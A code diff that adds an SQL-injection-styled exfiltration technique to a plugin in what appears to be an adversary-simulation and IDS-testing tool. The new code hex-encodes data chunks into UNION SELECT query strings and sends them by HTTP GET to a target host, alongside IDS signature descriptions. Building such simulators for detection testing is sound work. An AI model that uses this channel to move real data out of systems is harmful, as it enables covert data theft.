@@ -60,6 +60,9 @@ _SIGNATURES = {
     'icmp': ['ICMP payload larger than standard 8 bytes',
              'Non-zero ICMP padding content',
              'Repeated ICMP echo to single destination'],
+    'sqli': ['UNION SELECT pattern detected in HTTP GET parameters',
+             'Hex-encoded payload value in query string',
+             'Repeated incremental requests with MIAT-SIM sequence marker'],
 }
 
 
@@ -97,12 +100,17 @@ class ExfilPlugin(MIATPlugin):
             'http': (REQUESTS_AVAILABLE, 'pip install requests'),
             'dns':  (DNS_AVAILABLE,      'pip install dnspython'),
             'icmp': (SCAPY_AVAILABLE,    'pip install scapy + Npcap (Windows)'),
+            'sqli': (REQUESTS_AVAILABLE, 'pip install requests'),
         }
+        sqli_param   = args.get('sqli_param',   'id')
+        sqli_columns = int(args.get('sqli_columns', 3))
         if technique in guards:
             ok, msg = guards[technique]
             if not ok:
                 await self._emit(
-                    data={'error': msg, 'task_id': task_id}, success=False)
+                    data={'error': msg, 'task_id': task_id},
+                    success=False,
+                    endpoint='/api/agent/exfil/results/')
                 return
 
         # ── Payload acquisition ───────────────────────────────────────────────
@@ -116,14 +124,18 @@ class ExfilPlugin(MIATPlugin):
             if not payload_url:
                 await self._emit(
                     data={'error': 'payload_url missing for manual mode.',
-                          'task_id': task_id}, success=False)
+                          'task_id': task_id},
+                    success=False,
+                    endpoint='/api/agent/exfil/results/')
                 return
 
             transport = getattr(self, '_transport', None)
             if transport is None:
                 await self._emit(
                     data={'error': 'Transport not injected — cannot pull payload.',
-                          'task_id': task_id}, success=False)
+                          'task_id': task_id},
+                    success=False,
+                    endpoint='/api/agent/exfil/results/')
                 return
 
             await self._emit_live(
@@ -141,7 +153,9 @@ class ExfilPlugin(MIATPlugin):
             except (ValueError, RuntimeError) as exc:
                 await self._emit(
                     data={'error': f'Payload pull failed: {exc}',
-                          'task_id': task_id}, success=False)
+                          'task_id': task_id},
+                    success=False,
+                    endpoint='/api/agent/exfil/results/')
                 return
         else:
             # Generated mode — synthesise locally, instant, no network I/O
@@ -185,6 +199,11 @@ class ExfilPlugin(MIATPlugin):
                 result = await loop.run_in_executor(
                     None,
                     lambda c=chunk, s=i: self._send_icmp(c, s, target))
+            elif technique == 'sqli':
+                result = await loop.run_in_executor(
+                    None,
+                    lambda c=chunk, s=i: self._send_sqli(
+                        c, s, target, sqli_param, sqli_columns))
             else:
                 result = {'error': f'Unknown technique: {technique}'}
 
@@ -198,7 +217,9 @@ class ExfilPlugin(MIATPlugin):
             packets.append(result)
 
             desc   = (result.get('query_domain')
-                      or result.get('header_name') or target)
+                      or result.get('header_name')
+                      or result.get('injection_url')
+                      or target)
             status = (result.get('outcome')
                       or str(result.get('http_status', ''))
                       or ('SENT' if result.get('sent') else 'ERR'))
@@ -225,7 +246,7 @@ class ExfilPlugin(MIATPlugin):
             'errors':           errors,
             'duration_sec':     duration,
             'avg_interval_sec': round(duration / max(total - 1, 1), 2),
-            'ids_severity':     'HIGH' if technique in ('dns', 'icmp') else 'MEDIUM',
+            'ids_severity':     'HIGH' if technique in ('dns', 'icmp', 'sqli') else 'MEDIUM',
             'ids_signatures':   _SIGNATURES.get(technique, []),
             'packets':          packets,
             'task_id':          task_id,   # closes ModuleTask loop server-side
@@ -274,7 +295,8 @@ class ExfilPlugin(MIATPlugin):
             return {'header_name': name, 'header_value': value[:80],
                     'http_status': resp.status_code, 'raw_bytes': len(chunk)}
         except Exception as exc:
-            return {'header_name': name, 'error': str(exc), 'http_status': 0}
+            return {'header_name': name, 'header_value': value[:80],
+                    'error': str(exc), 'http_status': 0}
 
     def _send_icmp(self, chunk, seq, target):
         payload = f'[SEQ:{seq:03d}]'.encode() + chunk
@@ -287,3 +309,36 @@ class ExfilPlugin(MIATPlugin):
                     'sent': False}
         except Exception as exc:
             return {'error': str(exc), 'sent': False}
+
+    def _send_sqli(self, chunk, seq, target, param, columns):
+        hex_chunk    = chunk.hex()
+        hex_display  = (hex_chunk[:32] + '…') if len(hex_chunk) > 32 else hex_chunk
+        cols = []
+        for i in range(columns):
+            if i == 0:
+                cols.append(f"'{hex_chunk}'")
+            elif i == 1:
+                cols.append(str(seq))
+            elif i == 2:
+                cols.append("'MIAT-SIM'")
+            else:
+                cols.append('NULL')
+        sqli_payload = f"1 UNION SELECT {','.join(cols)}-- -"
+        url = f'http://{target}/?{param}={sqli_payload}'
+        try:
+            resp = requests.get(url, timeout=5, verify=False, allow_redirects=True)
+            return {
+                'injection_url': url[:120],
+                'sqli_param':    param,
+                'payload_hex':   hex_display,
+                'http_status':   resp.status_code,
+                'raw_bytes':     len(chunk),
+            }
+        except Exception as exc:
+            return {
+                'injection_url': url[:120],
+                'sqli_param':    param,
+                'payload_hex':   hex_display,
+                'error':         str(exc),
+                'http_status':   0,
+            }
